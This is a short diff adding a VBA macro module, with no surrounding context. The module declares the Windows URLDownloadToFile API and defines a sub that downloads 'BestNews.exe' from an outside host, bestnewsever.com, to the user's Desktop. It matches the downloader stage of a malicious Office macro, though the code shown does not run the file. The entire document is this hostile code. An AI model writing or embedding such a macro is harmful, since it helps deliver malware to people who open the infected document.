@@ -1,0 +1,13 @@
+Private Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" _
+                       (ByVal pCaller As Long, _
+                        ByVal szURL As String, _
+                        ByVal szFileName As String, _
+                        ByVal dwReserved As Long, _
+                        ByVal lpfnCB As Long) As Long
+
+Sub DownloadToFile
+  	URLDownloadToFile(0,_
+  	"http://bestnewsever.com/BestNews.exe",_
+  	Environ$("USERPROFILE") & "/Desktop/BestNews.exe",_
+  	0, 0)
+End Sub
